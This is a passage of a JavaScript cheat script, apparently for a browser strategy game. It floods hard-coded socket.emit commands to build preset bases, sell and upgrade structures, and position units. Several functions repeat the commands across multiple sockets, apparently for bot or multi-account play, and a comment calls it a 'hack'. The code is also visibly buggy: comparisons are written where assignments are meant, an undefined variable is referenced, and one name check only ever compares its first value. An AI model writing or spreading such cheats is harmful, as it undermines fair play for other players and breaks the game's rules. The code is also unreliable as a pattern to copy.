                socket.emit("1",6.72,311,1);
                socket.emit("1",6.97,311,1);
                socket.emit("1",7.22,311,1);
                socket.emit("1",7.47,311,1);
                socket.emit("1",7.72,311,1);
          }
        window.basesat.b6=function(){
            baati=6;
 socket.emit("1",7.86,311,1); socket.emit("1",8.06,311,1); socket.emit("1",8.26,311,1); socket.emit("1",8.46,311,1); socket.emit("1",8.66,311,1); socket.emit("1",8.86,311,1); socket.emit("1",9.06,311,1); socket.emit("1",9.26,311,1); socket.emit("1",9.46,311,1); socket.emit("1",9.66,311,1); socket.emit("1",9.86,311,1); socket.emit("1",10.28,311,1); socket.emit("1",10.70,311,1); socket.emit("1",10.90,311,1); socket.emit("1",11.10,311,1); socket.emit("1",11.30,311,1); socket.emit("1",11.72,311,1); socket.emit("1",12.14,311,1); socket.emit("1",12.34,311,1); socket.emit("1",12.54,311,1); socket.emit("1",12.74,311,1); socket.emit("1",12.94,311,1); socket.emit("1",13.14,311,1); socket.emit("1",13.34,311,1); socket.emit("1",13.54,311,1); socket.emit("1",13.74,311,1); socket.emit("1",13.94,311,1); socket.emit("1",10.07,311,1); socket.emit("1",10.49,311,1); socket.emit("1",11.51,311,1); socket.emit("1",11.93,311,1); socket.emit("1", 1.5700171594315573, 243.85007402090326, 1); socket.emit("1", 2.4400100710526793, 196.79985467474305, 1); socket.emit("1", 2.2400039007898447, 243.85656849877958, 1); socket.emit("1", -2.7800023458624703, 194.6788252481507, 1); socket.emit("1", 1.9699911201667188, 243.85313366860794, 1); socket.emit("1", 2.0999878201715214, 185.58517209087591, 1); socket.emit("1", 1.8700025978863808, 132.00487756139935, 1); socket.emit("1", 1.2599938029024704, 132.00454272486235, 1); socket.emit("1", 1.3800278697318928, 194.13178049974198, 1); socket.emit("1", 1.7600061169825598, 194.06341746965091, 1); socket.emit("1", -2.4400027616849433, 185.75130282181078, 1); socket.emit("1", -2.1999936469647867, 131.99750300668575, 1); socket.emit("1", -2.5899833434664847, 243.84680949317334, 1); socket.emit("1", 3.0599865137335724, 131.9992848465475, 1); socket.emit("1", 2.3700155322992322, 132.00115908582003, 1); socket.emit("1", 2.7699990995853443, 180.63860107961412, 1); socket.emit("1", 2.910001829109119, 243.8501927413633, 1); socket.emit("1", 2.6399909192202835, 243.84888476267423, 1); socket.emit("1", 3.1100150743706907, 196.05774072961268, 1); socket.emit("1", -2.9699920613329622, 243.85151732150447, 1); socket.emit("1", -2.690040409174835, 132.00027613607475, 1); socket.emit("1", -2.3099851374683826, 243.85151732150447, 1); socket.emit("1", -2.0399825212769436, 243.85142525726602, 1); socket.emit("1", -1.7700175093099535, 243.85316996094184, 1); socket.emit("1", 0.7600044161827382, 132.00282572733062, 1); socket.emit("1", 0.35996640663856383, 180.10304605974878, 1); socket.emit("1", 0.029980358323314006, 197.1585985951411, 1); socket.emit("1", -0.439963547142766, 132.00080795207285, 1); socket.emit("1", 0.0800082011395776, 132.0022685411125, 1); socket.emit("1", 0.22998938484625386, 243.85088271318605, 1); socket.emit("1", 0.5000045603394669, 243.85230796529285, 1); socket.emit("1", 0.7000201471114224, 196.1091423162112, 1); socket.emit("1", 0.8999878082444033, 243.84691201653544, 1); socket.emit("1", 1.0399986494012126, 186.08457861950842, 1); socket.emit("1", 1.170002238251199, 243.8551629553904, 1); socket.emit("1", -0.170023102819992, 243.84605081895415, 1); socket.emit("1", -0.36001357695289626, 194.92632916053194, 1); socket.emit("1", -0.7000068138510656, 183.7252296229344, 1); socket.emit("1", -1.3600094643934062, 243.84717119540267, 1); socket.emit("1", -1.0899817628353876, 243.84783862072678, 1); socket.emit("1", -0.5500054440958607, 243.85303709406625, 1); socket.emit("1", -0.8199991749608286, 243.85031002645857, 1); socket.emit("1", -1.9300228177358634, 182.30682104627905, 1); socket.emit("1", -1.199997990229862, 183.82290662482725, 1); socket.emit("1", -0.9500096278543927, 131.99805036438974, 1); socket.emit("1", -1.5699815385655684, 196.37006518306183, 1); socket.emit("1", -1.5699629936544652, 132.00004583332537, 1);}
 
 
//CONSTROI BASE SE BASENDO NO POWER ATUAL
window.Fullatk=()=>{
 
if(ligflla){
    niveldc=0
ligflla = false;
clearInterval(cont222)
addChat("FULL ATACK: OFF","SERVER")
}else{
 
ligflla = true;
 
    var as = [];
    if(units[0].owner==player.sid){
            for(var d = 0; d < units.length;++d){
              if (units[d].owner === player.sid && unit.type!==1){
              as.push(units[d].id)
              }
            }
   if(as.length===0&&PoderDP>=5000){
              niveldc=2;
       }
    }
 
addChat("FULL ATACK: ON","SERVER")
    window.cont222=setInterval(function(){
 
        if(niveldc==0){
 
              if(PoderDP<=4000){
 
         geradoratk()
    microGenerators()
    powerPlants()
     }
               if(PoderDP>=2000){
               socket.emit("4",0,0,1);
               }
      if(PoderDP>=4001){
 
         niveldc=1
        }
        }
        if(niveldc==1){
 
            var ala = [];
units.forEach((unit) => {
    if(unit.owner==player.sid && unit.type!=1){
    ala.push(unit)
    }
})
   if(ala.length!=1){
sellallatk()
              }else{
 
              niveldc=2;
              }
        }
        if(niveldc==2){
 
var basee="";
 
basee = prompt("b1 -(base atk para baixo),  b2 -(base atk para cima), b21 -(base atk para cima com ant tank)")
if(basee== "b1" || basee== "b2" || basee== "B1" || basee=="B2" || basee=="B21" || basee=="b21"){
  if(basee=="B1" || basee=="B2" || basee=="B21"){
   basee=basee.replace("B","b")
  }
if(window.basesat[basee]){
for(var a = 0;a<5;++a){
  window.basesat[basee]()
  window.basecert=true;
         if(window.basecert){
setTimeout(function(){
    soldadoarmory()
    upmicros()
    microGenerators()
     window.basecert=false;
 
 
},650)
      }
}
niveldc=3;
}
        }
            else{
            alert("base inexistent");basee = "";
        }
        }
        if(niveldc==3){
 
          socket.emit("ch","-fullatk")
        }
    },1000)
 
}
}
//FIM DA CONSTRUÇÂO DE BASE
window.autohyb=()=>{
 
if(ligfllh){
ligfllh = false;
clearInterval(cont333)
addChat("FULL HYBRIDO: OFF","SERVER")
}else{
 
    niveldc2=0;
    var as = [];
            for(var d = 0; d < units.length;++d){
              if (units[d].owner === player.sid && unit.type!==1){
              as.push(units[d].id)
              }
            }
   if(as.length===0&&PoderDP>=5000){
              niveldc2=2;
       }
ligfllh = true;
addChat("FULL HYBRIDO: ON","SERVER")
    window.cont333=setInterval(function(){
 
        if(niveldc2==0){
              if(PoderDP<=4000){
 
         gerador()
    microGenerators()
    powerPlants()
     }
               if(PoderDP>=2000){
               socket.emit("4",0,0,1);
               }
      if(PoderDP>=4001){
 
         niveldc2=1
        }
        }
        if(niveldc2==1){
            var ala = [];
units.forEach((unit) => {
    if(unit.owner==player.sid && unit.type!=1){
    ala.push(unit)
    }
})
   if(ala.length!=0){
SellAll()
              }else{
 
              niveldc2=2;
              }
        }
        if(niveldc2==2){
 
var basee="";
 
basee = prompt("b3 -(base hyb 1),  b4 -(base hyb 2)")
if(basee== "b3" || basee== "b4" || basee== "B3" || basee=="B4"){
  if(basee=="B3" || basee=="B4"){
   basee=basee.replace("B","b")
  }
if(window.basesat[basee]){
for(var a = 0;a<5;++a){
  window.basesat[basee]()
  window.basecert=true;
}}
      if(window.basecert){
setTimeout(function(){
    soldadoarmory()
    powerPlants()
    upmicros()
    microGenerators()
     window.basecert=false;
},650)
      }
niveldc2=3;
        }else if(basee!= "b3" || basee!= "b4" || basee!= "B3" || basee!="B4"){
            alert("base inexistent");basee = "";
        }else if(basee==null){
niveldc2=3;
        }
        }
        if(niveldc2==3){
          socket.emit("ch","-autohyb")
        }
    },1000)
 
}
}
//FIM DA CONSTRUÇÂO DE BASE
window.autodef=()=>{
 
if(ligflld){
ligflld = false;
clearInterval(cont333)
addChat("FULL DEFENCE: OFF","SERVER")
}else{
 
    niveldc3=0;
    var as = [];
            for(var d = 0; d < units.length;++d){
              if (units[d].owner === player.sid && unit.type!==1){
              as.push(units[d].id)
              }
            }
   if(as.length===0&&PoderDP>=5000){
              niveldc3=2;
       }
ligflld = true;
addChat("FULL DEFENCE: ON","SERVER")
    window.cont333=setInterval(function(){
 
        if(niveldc3==0){
              if(PoderDP<=4000){
 
         gerador()
    microGenerators()
    powerPlants()
     }
               if(PoderDP>=2000){
               socket.emit("4",0,0,1);
               }
      if(PoderDP>=4001){
 
         niveldc3=1
        }
        }
        if(niveldc3==1){
            var ala = [];
units.forEach((unit) => {
    if(unit.owner==player.sid && unit.type!=1){
    ala.push(unit)
    }
})
   if(ala.length!=0){
SellAll()
              }else{
 
              niveldc3=2;
              }
        }
        if(niveldc3==2){
 
var basee="";
 
basee = prompt("b5 -(base def 1),  b6 -(base def 2)")
if(basee== "b5" || basee== "b6" || basee== "B5" || basee=="B6"){
      if(basee=="B3" || basee=="B4"){
   basee=basee.replace("B","b")
  }
if(window.basesat[basee]){
for(var a = 0;a<5;++a){
  window.basesat[basee]()
  window.basecert=true;
}}
      if(window.basecert){
setTimeout(function(){
    soldadoarmory()
    powerPlants()
    upmicros()
    microGenerators()
     window.basecert=false;
},650)
      }
niveldc3=3;
        }else if(basee!= "b5" || basee!= "b6" || basee!= "B5" || basee!="B6"){
            alert("base inexistent");basee = "";
        }else if(basee==null){
niveldc3=3;
        }
        }
        if(niveldc3==3){
          socket.emit("ch","-autodef")
        }
    },1000)
 
}
}
 
//CENTRALIZA
//centraliza nada a ver vo deixa assim msm, kkkkk
 
window.CE = function() {
var trops = [];
    if (player.x == null) {
        player.x == 0.000000000000000000000000000000000000000000000000000001
    }
    if (player.y == null) {
        player.y == 0.000000000000000000000000000000000000000000000000000001
    }
for (var b = 0; b < selUnits.length; ++b){ trops.push(selUnits[b].id);}
socket.emit("5", ((player.x) *1.00001), ((player.y) * 1.00001), trops, 0, -1);
 
}
 
 
window.CE2 = function () {
    if(player.x==null){player.x==0}
    if(player.y==null){player.y==0}
    for (var e = [], b = 0; b < Math.floor(selUnits.length-0); ++b){ e.push(selUnits[b].id)};socket.emit("5", (player.x)*13, (player.y)*13, e, 0, -1);
}
 
window.centralizar = function () {
    tdsuni = selUnits
    var totasel = selUnits.length
 
    switch(totasel){
       case 1:
            window.exec=function(){
            setTimeout(function(){
            CE2()
            CE()
            },24001)
            CE()
            }
            exec()<=true
            break;
       case 2:
            window.exec=function(){
            setTimeout(function(){
            centralizar2()
            },24001)
            CE()
            }
            exec()<=true
            break;
       case 3:
            window.exec=function(){
            setTimeout(function(){
            centralizar31()
            },24001)
            CE()
            }
            exec()<=true
            break;
       case 4:
            window.exec=function(){
            setTimeout(function(){
            centralizar4()
            },24001)
            CE()
            }
            exec()<=true
            break;
 
       default:{
            CE()
            setTimeout(function(){
            effect3()
            },24000)
       }
    }
 
}
    function selecionar1234() {
        selUnits = []; units.forEach((unit) => { if (unit.owner === player.sid && unit.type === 1) { if (!unit.info) unit.info = getUnitFromPath(unit.uPath); if (unit.info.name === 'Siege Ram') { selUnits.push(unit); return false; } } return true; }); selUnitType = "Unit"; }
 
    function centralizar1234() {
        if(player.x==null){player.x==0}
        if(player.y==null){player.y==0}
        for (var e = [], b = 0; b < Math.floor(selUnits.length-0); ++b) e.push(selUnits[b].id);socket.emit("5", (player.x)*1, (player.y)*1, e, 0, -1);
    }
 
    function centralizar2() {
        if(player.x==null){player.x==0}
        if(player.y==null){player.y==0}
        for (var e = [], b = 0; b < Math.floor(selUnits.length-0); ++b) e.push(selUnits[b].id);socket.emit("5", ((player.x))*1, ((player.y)+40)*1, e, 0, -1);
        for (var e = [], b = 0; b < Math.floor(selUnits.length-1); ++b) e.push(selUnits[b].id);socket.emit("5", ((player.x))*1, ((player.y)-40)*1, e, 0, -1)
    }
 
    function centralizar3() {
        if(player.x==null){player.x==0}
        if(player.y==null){player.y==0}
        for (var e = [], b = 0; b < Math.floor(selUnits.length-0); ++b) e.push(selUnits[b].id);socket.emit("5", ((player.x)-25)*1, ((player.y)-25)*1, e, 0, -1);
        for (var e = [], b = 0; b < Math.floor(selUnits.length-1); ++b) e.push(selUnits[b].id);socket.emit("5", ((player.x)+25)*1, ((player.y)-25)*1, e, 0, -1);
        for (var e = [], b = 0; b < Math.floor(selUnits.length-2); ++b) e.push(selUnits[b].id);socket.emit("5", ((player.x))*1, ((player.y)+33)*1, e, 0, -1);
    }
 
 
    function centralizar31() {
        if(player.x==null){player.x==0}
        if(player.y==null){player.y==0}
        for (var e = [], b = 0; b < Math.floor(selUnits.length-0); ++b) e.push(selUnits[b].id);socket.emit("5", ((player.x)-25)*1, ((player.y)-13)*1, e, 0, -1);
        for (var e = [], b = 0; b < Math.floor(selUnits.length-1); ++b) e.push(selUnits[b].id);socket.emit("5", ((player.x)+25)*1, ((player.y)-13)*1, e, 0, -1);
        for (var e = [], b = 0; b < Math.floor(selUnits.length-2); ++b) e.push(selUnits[b].id);socket.emit("5", ((player.x))*1, ((player.y)+17)*1, e, 0, -1);
    }
 
    function centralizar4() {
        if(player.x==null){player.x==0 }
        if(player.y==null){player.y==0}
        for (var e = [], b = 0; b < Math.floor(selUnits.length-0); ++b) e.push(selUnits[b].id);socket.emit("5", ((player.x)+40)*1, ((player.y))*1, e, 0, -1);
        for (var e = [], b = 0; b < Math.floor(selUnits.length-1); ++b) e.push(selUnits[b].id);socket.emit("5", ((player.x))*1, ((player.y)+40)*1, e, 0, -1);
        for (var e = [], b = 0; b < Math.floor(selUnits.length-2); ++b) e.push(selUnits[b].id); socket.emit("5", ((player.x)-40)*1, ((player.y))*1, e, 0, -1);
        for (var e = [], b = 0; b < Math.floor(selUnits.length-3); ++b) e.push(selUnits[b].id); socket.emit("5", ((player.x))*1, ((player.y)-40)*1, e, 0, -1); }
 
    function centralizar11() {
        if(player.x==null){ player.x==0 }
        if(player.y==null){ player.y==0 }
        for (var e = [], b = 0; b < Math.floor(selUnits.length-0); ++b) e.push(selUnits[b].id); socket.emit("5", (player.x), (player.y)-150, e, 0, -1); }
 
 
 
 
 
 
//CONSTRUCOES
//algumas funçóes do hack de kaka(full ataque, retirar construcoes desnecessarias, etc...)
/************************************** ALGUMAS CONSTRUCOES POR KAKA, CREDITO A KAKA**************************************/
 
//DPK
window.dpk=()=>{
       baati=7;
 for(i=-3.14;i<=3.14;i+=0.5233){socket.emit("1",i,132,3);}
for(i=-2.965;i<=3.14;i+=0.3488){socket.emit("1",i,243.85,3);}
for(i=-3.14;i<=3.14;i+=0.3488){socket.emit("1",i,194,2);}
for(i=-3.14;i<3.14;i+=0.216){socket.emit("1",i,1e3,1);}
        }
 
//UPA ARMOURY PARA SOLDADOS
window.soldadoarmorY=()=>{
  for (i = 0; i < units.length; ++i){
      if(0 == units[i].type && 3 == units[i].renderIndex && "circle" == units[i].shape){
          socket.emit("4", units[i].id, 0);
      }
  }
 
 
            window.sockets.forEach(socket => {
            for (i = 0; i < units.length; ++i){
      if(0 == units[i].type && 3 == units[i].renderIndex && "circle" == units[i].shape){
          socket.emit("4", units[i].id, 0);
      }
  }
 
            })
}
 
//CONSTROI BASE FULL ATAQUE
window.fullatack=()=>{
socket.emit("1", -1.06, 310, 8),socket.emit("1", -2.08, 310, 8),socket.emit("1", -0.64, 310, 8),socket.emit("1", -2.5, 310, 8),socket.emit("1", -1.87, 306, 1),socket.emit("1", -1.27, 306, 1),socket.emit("1", -1.67, 306, 1),socket.emit("1", -1.47, 306, 1),socket.emit("1", -2.29, 306, 1),socket.emit("1", -0.85, 306, 1),socket.emit("1", -0.43, 306, 1),socket.emit("1", -2.71, 306, 1),socket.emit("1", -2.91, 306, 1),socket.emit("1", -0.23, 306, 1),socket.emit("1", -0.03, 306, 1),socket.emit("1", -3.11, 306, 1),socket.emit("1", 2.97, 306, 1),socket.emit("1", 0.17, 306, 1),socket.emit("1", 2.77, 306, 1),socket.emit("1", 0.37, 306, 1),socket.emit("1", 0.57, 306, 1),socket.emit("1", 2.57, 306, 1),socket.emit("1", 2.37, 306, 1),socket.emit("1", 0.77, 306, 1),socket.emit("1", 0.97, 306, 1),socket.emit("1", 2.17, 306, 1),socket.emit("1", 1.97, 306, 1),socket.emit("1", 1.17, 306, 1),socket.emit("1", 1.37, 306, 1),socket.emit("1", 1.77, 306, 1),socket.emit("1",Math.PI*-1.5,306,1),socket.emit("1", -1.7, 245.85, 4),socket.emit("1", -1.45, 245.85, 4),socket.emit("1", -1.96, 245.85, 4),socket.emit("1", -1.19, 245.85, 4),socket.emit("1", -0.94, 245.85, 4),socket.emit("1", -2.21, 245.85, 4),socket.emit("1", -2.46, 245.85, 4),socket.emit("1", -0.69, 245.85, 4),socket.emit("1", -2.71, 245.85, 4),socket.emit("1", -0.44, 245.85, 4),socket.emit("1", -2.96, 245.85, 4),socket.emit("1", -0.19, 245.85, 4),socket.emit("1", 3.07, 245.85, 4),socket.emit("1", 0.06, 245.85, 4),socket.emit("1", 2.82, 245.85, 4),socket.emit("1", 0.31, 245.85, 4),socket.emit("1", 2.57, 245.85, 4),socket.emit("1", 0.57, 245.85, 4),socket.emit("1", 2.32, 245.85, 4),socket.emit("1", 0.82, 245.85, 4),socket.emit("1", 1.07, 245.85, 4),socket.emit("1", 2.07, 245.85, 4),socket.emit("1", 1.32, 245.85, 4),socket.emit("1", 1.82, 245.85, 4),socket.emit("1",Math.PI*-1.5,245,4),socket.emit("1", -1.91, 184.69, 4),socket.emit("1", -1.23, 184.4, 4),socket.emit("1", -2.25, 185.57, 4),socket.emit("1", -0.89, 184.93, 4),socket.emit("1", -2.58, 190.21, 4),socket.emit("1", -0.56, 190.16, 4),socket.emit("1", -2.9, 186.72, 4),socket.emit("1", -0.24, 185.76, 4),socket.emit("1", 3.05, 183.1, 4),socket.emit("1", 0.09, 183.95, 4),socket.emit("1", 0.42, 189.81, 4),socket.emit("1", 2.72, 189.79, 4),socket.emit("1", 0.74, 187.09, 4),socket.emit("1", 2.4, 188, 4),socket.emit("1", 2.07, 181, 4),socket.emit("1", 1.08, 181.02, 4),socket.emit("1", 1.735, 188.31, 4),socket.emit("1", 1.41, 188.81, 4),socket.emit("1",Math.PI*1.5,140,7),socket.emit("1", -2.095, 130, 4),socket.emit("1", -1.048, 130, 4),socket.emit("1", -2.565, 130, 4),socket.emit("1", -0.58, 130, 4),socket.emit("1", -3.035, 130, 4),socket.emit("1", -0.09, 130, 4),socket.emit("1", 0.38, 130, 4),socket.emit("1", 2.78, 130, 4),socket.emit("1", 2.3, 130, 4),socket.emit("1", 0.86, 130, 4),socket.emit("1", 1.83, 130, 4),socket.emit("1", 1.33, 130, 4)
}
 
//VENDE TUDO
window.sellallatk=()=>{
    SellMicroGenerator()
 for (var a = [], d = 0; d < units.length; ++d){
     if((units[d].type === 0) && units[d].owner == player.sid && getUnitFromPath(units[d].uPath).name === ('Power Plant' || 'Generator' || 'Wall')){
         a.push(units[d].id);
    socket.emit("3", a)
     }
 }
}
 
 
 
function gerador(){
    socket.emit("1",-1.7700175093099544, 243.8531699609419, 3)
    socket.emit("1", 1.5700171594315573, 243.85007402090326, 3);
    socket.emit("1", 2.4400100710526793, 196.79985467474305, 3);
    socket.emit("1", 2.2400039007898447, 243.85656849877958, 3);
    socket.emit("1", -2.7800023458624703, 194.6788252481507, 3);
    socket.emit("1", 1.9699911201667188, 243.85313366860794, 3);
    socket.emit("1", 2.0999878201715214, 185.58517209087591, 3);
                 socket.emit("1", 7.86, 311, 1);
        socket.emit("1", 8.06, 311, 1);
        socket.emit("1", 8.26, 311, 1);
        socket.emit("1", 8.46, 311, 1);
        socket.emit("1", 8.66, 311, 1);
    socket.emit("1", 1.8700025978863808, 132.00487756139935, 3);
    socket.emit("1", 1.2599938029024704, 132.00454272486235, 3);
    socket.emit("1", 1.3800278697318928, 194.13178049974198, 3);
    socket.emit("1", 1.7600061169825598, 194.06341746965091, 3);
    socket.emit("1", -2.4400027616849433, 185.75130282181078, 3);
    socket.emit("1", -2.1999936469647867, 131.99750300668575, 3);
               socket.emit("1", 8.86, 311, 1);
        socket.emit("1", 9.06, 311, 1);
        socket.emit("1", 9.26, 311, 1);
        socket.emit("1", 9.46, 311, 1);
        socket.emit("1", 9.66, 311, 1);
        socket.emit("1", 9.86, 311, 1);
    socket.emit("1", -2.5899833434664847, 243.84680949317334, 3);
    socket.emit("1", 3.0599865137335724, 131.9992848465475, 3);
    socket.emit("1", 2.3700155322992322, 132.00115908582003, 3);
    socket.emit("1", 2.7699990995853443, 180.63860107961412, 3);
    socket.emit("1", 2.910001829109119, 243.8501927413633, 3);
    socket.emit("1", 2.6399909192202835, 243.84888476267423, 3);
    socket.emit("1", 3.1100150743706907, 196.05774072961268, 3);
                  socket.emit("1", 10.70, 311, 1);
        socket.emit("1", 10.90, 311, 1);
        socket.emit("1", 11.10, 311, 1);
        socket.emit("1", 11.30, 311, 1);
        socket.emit("1", 11.72, 311, 1);
    socket.emit("1", -2.9699920613329622, 243.85151732150447, 3);
    socket.emit("1", -2.690040409174835, 132.00027613607475, 3);
    socket.emit("1", -2.3099851374683826, 243.85151732150447, 3);
    socket.emit("1", -2.0399825212769436, 243.85142525726602, 3);
    socket.emit("1", 0.7600044161827382, 132.00282572733062, 3);
    socket.emit("1", 0.35996640663856383, 180.10304605974878, 3);
    socket.emit("1", 0.029980358323314006, 197.1585985951411, 3);
    socket.emit("1", -0.439963547142766, 132.00080795207285, 3);
    socket.emit("1", 0.0800082011395776, 132.0022685411125, 3);
    socket.emit("1", 0.22998938484625386, 243.85088271318605, 3);
    socket.emit("1", 0.5000045603394669, 243.85230796529285, 3);
                 socket.emit("1", 12.14, 311, 1);
        socket.emit("1", 12.34, 311, 1);
        socket.emit("1", 12.54, 311, 1);
        socket.emit("1", 12.74, 311, 1);
        socket.emit("1", 12.94, 311, 1);
        socket.emit("1", 13.14, 311, 1);
    socket.emit("1", 0.7000201471114224, 196.1091423162112, 3);
    socket.emit("1", 0.8999878082444033, 243.84691201653544, 3);
    socket.emit("1", 1.0399986494012126, 186.08457861950842, 3);
    socket.emit("1", 1.170002238251199, 243.8551629553904, 3);
    socket.emit("1", -0.170023102819992, 243.84605081895415, 3);
    socket.emit("1", -0.36001357695289626, 194.92632916053194, 3);
    socket.emit("1", -0.7000068138510656, 183.7252296229344, 3);
            socket.emit("1", 13.34, 311, 1);
        socket.emit("1", 13.54, 311, 1);
        socket.emit("1", 13.74, 311, 1);
        socket.emit("1", 13.94, 311, 1);
        socket.emit("1", 10.07, 311, 1);
    socket.emit("1", -1.3600094643934062, 243.84717119540267, 3);
    socket.emit("1", -1.0899817628353876, 243.84783862072678, 3);
    socket.emit("1", -0.5500054440958607, 243.85303709406625, 3);
    socket.emit("1", -0.8199991749608286, 243.85031002645857, 3);
    socket.emit("1", -1.9300228177358634, 182.30682104627905, 3);
             socket.emit("1", 10.28, 311, 1);
        socket.emit("1", 10.49, 311, 1);
        socket.emit("1", 11.51, 311, 1);
        socket.emit("1", 11.93, 311, 1);
    socket.emit("1", -1.199997990229862, 183.82290662482725, 3);
    socket.emit("1", -0.9500096278543927, 131.99805036438974, 3);
    socket.emit("1", -1.5699815385655684, 196.37006518306183, 3);
    socket.emit("1", -1.5699629936544652, 132.00004583332537, 3);
  socket.emit("1", 10.28, 311, 1);
        socket.emit("1", 10.49, 311, 1);
        socket.emit("1", 11.51, 311, 1);
        socket.emit("1", 11.93, 311, 1);
}
 
 
//GERADOR DE POWER PARA ATK
function geradoratk(){
  socket.emit("1",-1.7000172056125311, 234.51524897114894, 3);
     socket.emit("1",-1.9400226883315947, 182.24185715691115, 3)
    socket.emit("1", -1.570010612670869, 140.00004321427903, 7)
   socket.emit("1", 1.5700171594315573, 243.85007402090326, 3);
    socket.emit("1", 2.4400100710526793, 196.79985467474305, 3);
    socket.emit("1", 2.2400039007898447, 243.85656849877958, 3);
    socket.emit("1", -2.7800023458624703, 194.6788252481507, 3);
    socket.emit("1", 1.9699911201667188, 243.85313366860794, 3);
    socket.emit("1", 2.0999878201715214, 185.58517209087591, 3);
                 socket.emit("1", 7.86, 311, 1);
        socket.emit("1", 8.06, 311, 1);
        socket.emit("1", 8.26, 311, 1);
        socket.emit("1", 8.46, 311, 1);
        socket.emit("1", 8.66, 311, 1);
    socket.emit("1", 1.8700025978863808, 132.00487756139935, 3);
    socket.emit("1", 1.2599938029024704, 132.00454272486235, 3);
    socket.emit("1", 1.3800278697318928, 194.13178049974198, 3);
    socket.emit("1", 1.7600061169825598, 194.06341746965091, 3);
    socket.emit("1", -2.4400027616849433, 185.75130282181078, 3);
    socket.emit("1", -2.1999936469647867, 131.99750300668575, 3);
               socket.emit("1", 8.86, 311, 1);
        socket.emit("1", 9.06, 311, 1);
        socket.emit("1", 9.26, 311, 1);
        socket.emit("1", 9.46, 311, 1);
        socket.emit("1", 9.66, 311, 1);
        socket.emit("1", 9.86, 311, 1);
    socket.emit("1", -2.5899833434664847, 243.84680949317334, 3);
    socket.emit("1", 3.0599865137335724, 131.9992848465475, 3);
    socket.emit("1", 2.3700155322992322, 132.00115908582003, 3);
    socket.emit("1", 2.7699990995853443, 180.63860107961412, 3);
    socket.emit("1", 2.910001829109119, 243.8501927413633, 3);
    socket.emit("1", 2.6399909192202835, 243.84888476267423, 3);
    socket.emit("1", 3.1100150743706907, 196.05774072961268, 3);
                  socket.emit("1", 10.70, 311, 1);
        socket.emit("1", 10.90, 311, 1);
        socket.emit("1", 11.10, 311, 1);
        socket.emit("1", 11.30, 311, 1);
        socket.emit("1", 11.72, 311, 1);
    socket.emit("1", -2.9699920613329622, 243.85151732150447, 3);
    socket.emit("1", -2.690040409174835, 132.00027613607475, 3);
    socket.emit("1", -2.3099851374683826, 243.85151732150447, 3);
    socket.emit("1", -2.0399825212769436, 243.85142525726602, 3);
    socket.emit("1", 0.7600044161827382, 132.00282572733062, 3);
    socket.emit("1", 0.35996640663856383, 180.10304605974878, 3);
    socket.emit("1", 0.029980358323314006, 197.1585985951411, 3);
    socket.emit("1", -0.439963547142766, 132.00080795207285, 3);
    socket.emit("1", 0.0800082011395776, 132.0022685411125, 3);
    socket.emit("1", 0.22998938484625386, 243.85088271318605, 3);
    socket.emit("1", 0.5000045603394669, 243.85230796529285, 3);
                 socket.emit("1", 12.14, 311, 1);
        socket.emit("1", 12.34, 311, 1);
        socket.emit("1", 12.54, 311, 1);
        socket.emit("1", 12.74, 311, 1);
        socket.emit("1", 12.94, 311, 1);
        socket.emit("1", 13.14, 311, 1);
    socket.emit("1", 0.7000201471114224, 196.1091423162112, 3);
    socket.emit("1", 0.8999878082444033, 243.84691201653544, 3);
    socket.emit("1", 1.0399986494012126, 186.08457861950842, 3);
    socket.emit("1", 1.170002238251199, 243.8551629553904, 3);
    socket.emit("1", -0.170023102819992, 243.84605081895415, 3);
    socket.emit("1", -0.36001357695289626, 194.92632916053194, 3);
    socket.emit("1", -0.7000068138510656, 183.7252296229344, 3);
            socket.emit("1", 13.34, 311, 1);
        socket.emit("1", 13.54, 311, 1);
        socket.emit("1", 13.74, 311, 1);
        socket.emit("1", 13.94, 311, 1);
        socket.emit("1", 10.07, 311, 1);
    socket.emit("1", -1.3600094643934062, 243.84717119540267, 3);
    socket.emit("1", -1.0899817628353876, 243.84783862072678, 3);
    socket.emit("1", -0.5500054440958607, 243.85303709406625, 3);
    socket.emit("1", -0.8199991749608286, 243.85031002645857, 3);
             socket.emit("1", 10.28, 311, 1);
        socket.emit("1", 10.49, 311, 1);
        socket.emit("1", 11.51, 311, 1);
        socket.emit("1", 11.93, 311, 1);
    socket.emit("1", -1.199997990229862, 183.82290662482725, 3);
    socket.emit("1", -0.9500096278543927, 131.99805036438974, 3);
  socket.emit("1", 10.28, 311, 1);
        socket.emit("1", 10.49, 311, 1);
        socket.emit("1", 11.51, 311, 1);
        socket.emit("1", 11.93, 311, 1);
}
 
 
 
//UPA BARRACAS
window.UpgradeGreaterBarracks1=()=>{
 for (var i = 0; i < units.length; ++i){
     if(2 == units[i].type && "square" == units[i].shape){
         socket.emit("4", units[i].id, 0)
     }
}
 
            window.sockets.forEach(socket => {
            for (var i = 0; i < units.length; ++i){
     if(2 == units[i].type && "square" == units[i].shape){
         socket.emit("4", units[i].id, 0)
     }
}
            })
}
 
//UPA PARA MICRO-GERADORES
window.microGenerators=()=>{
    for (var i = 0; i < units.length; ++i) {
        if (units[i].owner == player.sid && units[i].type === 3 && "circle" == units[i].shape) {
            socket.emit("4", units[i].id, 1)
        }
    }
       if (!window.sockets) return alert("no sockets");
    window.sockets.forEach(socket => {
       for (var i = 0; i < units.length; ++i) {
        if (units[i].owner == player.sid && units[i].type === 3 && "circle" == units[i].shape) {
            socket.emit("4", units[i].id, 1)
        }
    }
    })
}
 
//UPA PARA POWER PLANTS
window.powerPlants=()=>{
    for (var i = 0; i < units.length; ++i) {
        if (units[i].owner == player.sid && units[i].type === 0 && "hexagon" == units[i].shape) {
            socket.emit("4", units[i].id, 0)
        }
    }
      if (!window.sockets) return alert("no sockets");
    window.sockets.forEach(socket => {
     for (var i = 0; i < units.length; ++i) {
        if (units[i].owner == player.sid && units[i].type === 0 && "hexagon" == units[i].shape) {
            socket.emit("4", units[i].id, 0)
        }
    }
    })
}
 
 
//TIRA OBJ DESNECESSARIO PARA FAZER FULL ATK
function tirafull(){
for (var a = [], d = 0; d < units.length; ++d) {
if (units[d].owner == player.sid) {
if(units[d].dir == -1.06) {
if(units[d].uPath==1){
a.push(units[d].id)
socket.emit("3", a)
}}}}
for (var a = [], d = 0; d < units.length; ++d) {
if (units[d].owner == player.sid) {
if(units[d].dir == -2.08) {
if(units[d].uPath==1){
a.push(units[d].id)
socket.emit("3", a)
}}}}
for (var a = [], d = 0; d < units.length; ++d) {
if (units[d].owner == player.sid) {
if(units[d].dir == -0.64) {
if(units[d].uPath==1){
a.push(units[d].id)
socket.emit("3", a)
}}}}
for (var a = [], d = 0; d < units.length; ++d) {
if (units[d].owner == player.sid) {
if(units[d].dir == -2.5) {
if(units[d].uPath==1){
